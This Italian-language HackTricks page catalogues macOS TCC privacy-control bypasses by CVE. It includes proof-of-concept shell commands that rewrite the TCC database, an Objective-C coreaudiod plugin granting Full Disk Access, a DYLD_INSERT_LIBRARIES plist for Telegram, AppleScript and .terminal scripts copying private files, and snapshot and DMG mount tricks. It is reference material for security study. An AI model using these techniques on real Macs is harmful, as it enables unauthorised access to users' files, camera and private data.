# macOS TCC Bypasses

<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Per funzionalità

### Bypass di Scrittura

Questo non è un bypass, è semplicemente come funziona TCC: **Non protegge dalla scrittura**. Se il Terminale **non ha accesso alla lettura del Desktop di un utente, può comunque scriverci dentro**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

L'**attributo esteso `com.apple.macl`** viene aggiunto al nuovo **file** per dare accesso all'applicazione dei **creatori** per leggerlo.

### TCC ClickJacking

È possibile **posizionare una finestra sopra il prompt TCC** per far sì che l'utente lo **accetti** senza accorgersene. Puoi trovare un PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/it/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Richiesta TCC con nome arbitrario

L'attaccante può **creare app con qualsiasi nome** (ad esempio Finder, Google Chrome...) nel **`Info.plist`** e farla richiedere l'accesso a una posizione protetta da TCC. L'utente penserà che l'applicazione legittima sia quella che richiede questo accesso.\
Inoltre, è possibile **rimuovere l'app legittima dal Dock e sostituirla con quella falsa**, quindi quando l'utente clicca su quella falsa (che può utilizzare la stessa icona) potrebbe chiamare quella legittima, chiedere i permessi TCC ed eseguire un malware, facendo credere all'utente che l'app legittima abbia richiesto l'accesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Ulteriori informazioni e PoC in:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### Bypass SSH

Per impostazione predefinita, un accesso tramite **SSH aveva "Accesso completo al disco"**. Per disabilitarlo è necessario averlo elencato ma disabilitato (rimuoverlo dall'elenco non rimuoverà quei privilegi):

![](<../../../../../.gitbook/assets/image (569).png>)

Qui puoi trovare esempi di come alcuni **malware siano riusciti a eludere questa protezione**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Nota che ora, per poter abilitare SSH, è necessario avere **Accesso completo al disco**
{% endhint %}

### Gestire le estensioni - CVE-2022-26767

L'attributo **`com.apple.macl`** viene dato ai file per dare a un'applicazione **specifici permessi per leggerlo**. Questo attributo viene impostato quando si **trascina** un file su un'app o quando un utente **fa doppio clic** su un file per aprirlo con l'applicazione **predefinita**.

Pertanto, un utente potrebbe **registrare un'applicazione dannosa** per gestire tutte le estensioni e chiamare i Launch Services per **aprire** qualsiasi file (così il file dannoso otterrà l'accesso per leggerlo).

### iCloud

Con il permesso **`com.apple.private.icloud-account-access`** è possibile comunicare con il servizio XPC **`com.apple.iCloudHelper`** che fornirà **token iCloud**.

**iMovie** e **Garageband** avevano questo permesso e altri che lo permettevano.

Per ulteriori **informazioni** sull'exploit per **ottenere i token iCloud** da quel permesso, controlla il talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automazione

Un'applicazione con il permesso **`kTCCServiceAppleEvents`** sarà in grado di **controllare altre App**. Ciò significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre App**.

Per ulteriori informazioni sugli Apple Scripts, controlla:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Ad esempio, se un'app ha **permesso di Automazione su `iTerm`**, ad esempio in questo esempio **`Terminal`** ha accesso su iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Su iTerm

Terminal, che non ha FDA, può chiamare iTerm, che ce l'ha, e usarlo per eseguire azioni:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}

```bash
osascript iterm.script
```

#### Attraverso Finder

Oppure, se un'app ha accesso tramite Finder, potrebbe eseguire uno script come questo:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Per comportamento dell'applicazione

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il demone **tccd** nello spazio utente utilizza la variabile **`HOME`** dell'ambiente per accedere al database degli utenti TCC da: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post di Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il demone TCC viene eseguito tramite `launchd` all'interno del dominio dell'utente corrente, è possibile **controllare tutte le variabili d'ambiente** passate ad esso.\
Pertanto, un **attaccante potrebbe impostare la variabile d'ambiente `$HOME`** in **`launchctl`** per puntare a una **directory controllata**, **riavviare** il demone **TCC**, e quindi **modificare direttamente il database TCC** per concedersi **tutti i privilegi TCC disponibili** senza mai chiedere il consenso all'utente finale.\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Note

Le note avevano accesso alle posizioni protette da TCC ma quando una nota viene creata questa viene **creata in una posizione non protetta**. Quindi, potevi chiedere alle note di copiare un file protetto in una nota (quindi in una posizione non protetta) e poi accedere al file:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocazione

Il binario `/usr/libexec/lsd` con la libreria `libsecurity_translocate` aveva il diritto `com.apple.private.nullfs_allow` che gli permetteva di creare un mount **nullfs** e aveva il diritto `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a ogni file.

Era possibile aggiungere l'attributo di quarantena a "Library", chiamare il servizio XPC **`com.apple.security.translocation`** e poi mappare Library a **`$TMPDIR/AppTranslocation/d/d/Library`** dove tutti i documenti all'interno di Library potevano essere **acceduti**.

### CVE-2023-38571 - Musica e TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Musica`** ha una caratteristica interessante: Quando è in esecuzione, importerà i file trascinati in **`~/Musica/Musica/Media.localized/Automaticamente Aggiungi a Musica.localized`** nella "libreria multimediale" dell'utente. Inoltre, chiama qualcosa del genere: **`rename(a, b);`** dove `a` e `b` sono:

* `a = "~/Musica/Musica/Media.localized/Automaticamente Aggiungi a Musica.localized/miofile.mp3"`
* `b = "~/Musica/Musica/Media.localized/Automaticamente Aggiungi a Musica.localized/Non Aggiunto.localized/2023-09-25 11.06.28/miofile.mp3`

Questo comportamento di **`rename(a, b);`** è vulnerabile a una **Race Condition**, poiché è possibile inserire nella cartella `Automaticamente Aggiungi a Musica.localized` un falso file **TCC.db** e poi quando viene creata la nuova cartella(b) copiare il file, eliminarlo e puntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="percorso/cartella"`** significa essenzialmente che **qualsiasi db aperto viene copiato in quel percorso**. In questa CVE questo controllo è stato abusato per **scrivere** all'interno di un **database SQLite** che verrà **aperto da un processo con FDA il database TCC**, e poi abusare di **`SQLITE_SQLLOG_DIR`** con un **symlink nel nome del file** in modo che quando quel database viene **aperto**, il database utente **TCC.db viene sovrascritto** con quello aperto.\
**Ulteriori informazioni** [**nel writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **e**[ **nel talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Se la variabile d'ambiente **`SQLITE_AUTO_TRACE`** è impostata, la libreria **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molti programmi utilizzavano questa libreria, quindi era possibile registrare tutte le loro query SQLite.

Diversi programmi Apple utilizzavano questa libreria per accedere a informazioni protette da TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Questa **variabile d'ambiente è utilizzata dal framework `Metal`** che è una dipendenza di vari programmi, soprattutto `Music`, che ha FDA.

Impostando quanto segue: `MTL_DUMP_PIPELINES_TO_JSON_FILE="percorso/nome"`. Se `percorso` è una directory valida, il bug verrà attivato e possiamo utilizzare `fs_usage` per vedere cosa succede nel programma:

* verrà `open()` un file chiamato `percorso/.dat.nosyncXXXX.XXXXXX` (X è casuale)
* uno o più `write()` scriveranno i contenuti nel file (non controlliamo questo)
* `percorso/.dat.nosyncXXXX.XXXXXX` verrà rinominato in `percorso/nome`

Si tratta di una scrittura temporanea di file, seguita da un **`rename(old, new)`** **che non è sicuro.**

Non è sicuro perché deve **risolvere i percorsi vecchi e nuovi separatamente**, il che può richiedere del tempo e essere vulnerabile a una Race Condition. Per ulteriori informazioni è possibile consultare la funzione `xnu` `renameat_internal()`.

{% hint style="danger" %}
Quindi, in sostanza, se un processo privilegiato sta rinominando da una cartella da te controllata, potresti ottenere un RCE e farlo accedere a un file diverso o, come in questo CVE, aprire il file creato dall'app privilegiata e memorizzare un FD.

Se il rename accede a una cartella da te controllata, mentre hai modificato il file di origine o hai un FD ad esso, cambia il file (o la cartella) di destinazione in modo che punti a un symlink, così potrai scrivere quando vuoi.
{% endhint %}

Questo è stato l'attacco nel CVE: Ad esempio, per sovrascrivere il `TCC.db` dell'utente, possiamo:

* creare `/Users/hacker/ourlink` per puntare a `/Users/hacker/Library/Application Support/com.apple.TCC/`
* creare la directory `/Users/hacker/tmp/`
* impostare `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* attivare il bug eseguendo `Music` con questa variabile d'ambiente
* intercettare l'`open()` di `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X è casuale)
* qui apriamo anche questo file per la scrittura e conserviamo il descrittore del file
* scambiamo atomicamente `/Users/hacker/tmp` con `/Users/hacker/ourlink` **in un ciclo**
* facciamo questo per massimizzare le nostre possibilità di successo poiché la finestra di gara è piuttosto stretta, ma perdere la gara ha un impatto trascurabile
* aspettiamo un po'
* verifichiamo se siamo stati fortunati
* se no, esegui di nuovo dall'inizio

Ulteriori informazioni su [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Ora, se provi a utilizzare la variabile d'ambiente `MTL_DUMP_PIPELINES_TO_JSON_FILE` le app non si avvieranno
{% endhint %}

### Apple Remote Desktop

Come root potresti abilitare questo servizio e l'**agente ARD avrà accesso completo al disco** che potrebbe poi essere abusato da un utente per fargli copiare un nuovo **database utente TCC**.

## Tramite **NFSHomeDirectory**

TCC utilizza un database nella cartella HOME dell'utente per controllare l'accesso a risorse specifiche per l'utente a **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile d'ambiente $HOME che punta a una **cartella diversa**, l'utente potrebbe creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e ingannare TCC per concedere qualsiasi permesso TCC a qualsiasi app.

{% hint style="success" %}
Si noti che Apple utilizza l'impostazione memorizzata nel profilo dell'utente nell'attributo **`NFSHomeDirectory`** per il **valore di `$HOME`**, quindi se comprometti un'applicazione con permessi per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), puoi **armare** questa opzione con un bypass di TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Il **primo POC** utilizza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la cartella **HOME** dell'utente.

1. Ottenere un blob _csreq_ per l'applicazione target.
2. Piazzare un falso file _TCC.db_ con l'accesso richiesto e il blob _csreq_.
3. Esportare l'entry dei Servizi di Directory dell'utente con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificare l'entry dei Servizi di Directory per cambiare la cartella home dell'utente.
5. Importare l'entry dei Servizi di Directory modificata con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrestare il _tccd_ dell'utente e riavviare il processo.

Il secondo POC ha utilizzato **`/usr/libexec/configd`** che aveva `com.apple.private.tcc.allow` con il valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile eseguire **`configd`** con l'opzione **`-t`**, un attaccante poteva specificare un **Bundle personalizzato da caricare**. Pertanto, l'exploit **sostituiva** il metodo **`dsexport`** e **`dsimport`** per cambiare la cartella home dell'utente con un **iniezione di codice configd**.

Per ulteriori informazioni, consulta il [**rapporto originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Tramite iniezione di processo

Ci sono diverse tecniche per iniettare codice all'interno di un processo e abusare dei suoi privilegi TCC:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Inoltre, l'iniezione di processo più comune per aggirare TCC è tramite **plugin (caricamento di librerie)**.\
I plugin sono codice aggiuntivo solitamente sotto forma di librerie o plist, che verranno **caricati dall'applicazione principale** ed eseguiti nel suo contesto. Pertanto, se l'applicazione principale aveva accesso ai file limitati da TCC (tramite permessi concessi o entitlement), il **codice personalizzato avrà lo stesso accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` aveva l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e non aveva il runtime **hardenizzato**.

Per armare questo CVE, il **`NFSHomeDirectory`** viene **cambiato** (abusando del precedente entitlement) per poter **prendere il controllo del database TCC dell'utente** per aggirare TCC.

Per ulteriori informazioni, consulta il [**rapporto originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Il binario **`/usr/sbin/coreaudiod`** aveva i diritti `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo **consentiva l'iniezione di codice** e il secondo gli dava accesso per **gestire TCC**.

Questo binario permetteva di caricare **plug-in di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Pertanto, era possibile **caricare un plugin e abusare dei permessi TCC** con questo PoC:

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```

Per ulteriori informazioni controlla il [**rapporto originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-in del Livello di Astrazione del Dispositivo (DAL)

Le applicazioni di sistema che aprono lo streaming della fotocamera tramite Core Media I/O (app con **`kTCCServiceCamera`**) caricano **in processo questi plugin** situati in `/Library/CoreMediaIO/Plug-Ins/DAL` (non soggetti a restrizioni SIP).

Basta memorizzare lì una libreria con il **costruttore** comune per riuscire a **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo.

### Firefox

L'applicazione Firefox aveva i permessi `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```

Per ulteriori informazioni su come sfruttare facilmente questo [**controlla il report originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` aveva i privilegi **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che consentivano di iniettare codice all'interno del processo e utilizzare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram aveva i privilegi **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, quindi era possibile abusarne per **accedere ai suoi permessi** come ad esempio registrare con la fotocamera. Puoi [**trovare il payload nella descrizione dettagliata**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota come utilizzare la variabile di ambiente per caricare una libreria è stato creato un **plist personalizzato** per iniettare questa libreria e **`launchctl`** è stato utilizzato per avviarla:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## Attraverso le invocazioni aperte

È possibile invocare **`open`** anche quando si è sandboxati

### Script del Terminale

È abbastanza comune concedere l'**Accesso Completo al Disco (FDA)** al terminale, almeno nei computer utilizzati da persone del settore tecnologico. Ed è possibile invocare script **`.terminal`** utilizzandolo.

Gli script **`.terminal`** sono file plist come questo con il comando da eseguire nella chiave **`CommandString`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```

Un'applicazione potrebbe scrivere uno script di terminale in una posizione come /tmp e lanciarlo con un comando come:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## Tramite il montaggio

### CVE-2020-9771 - bypass di TCC di mount\_apfs e escalation dei privilegi

**Qualsiasi utente** (anche non privilegiato) può creare e montare uno snapshot di time machine e **accedere a TUTTI i file** di tale snapshot.\
L'unico privilegio necessario è che l'applicazione utilizzata (come `Terminal`) abbia l'accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) che deve essere concesso da un amministratore.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Una spiegazione più dettagliata può essere **trovata nel report originale**.

### CVE-2021-1784 & CVE-2021-30808 - Montare sopra il file TCC

Anche se il file TCC DB è protetto, era possibile **montare sopra la directory** un nuovo file TCC.db:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

Controlla l'**exploit completo** nella [**relazione originale**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Lo strumento **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un altro posto eludendo le protezioni TCC.

### Servizi di localizzazione

C'è un terzo database TCC in **`/var/db/locationd/clients.plist`** per indicare i clienti autorizzati ad **accedere ai servizi di localizzazione**.\
La cartella **`/var/db/locationd/` non era protetta dal montaggio DMG** quindi era possibile montare il nostro plist.

## Da app di avvio

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Con grep

In diverse occasioni i file memorizzeranno informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (che contano come una vulnerabilità in Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Click sintetici

Questo non funziona più, ma lo **faceva in passato**:

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Un altro modo utilizzando **eventi CoreGraphics**:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Riferimento

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Modi per Eludere i Meccanismi di Privacy di macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Vittoria schiacciante contro TCC - 20+ NUOVI Modi per Eludere i Meccanismi di Privacy di MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
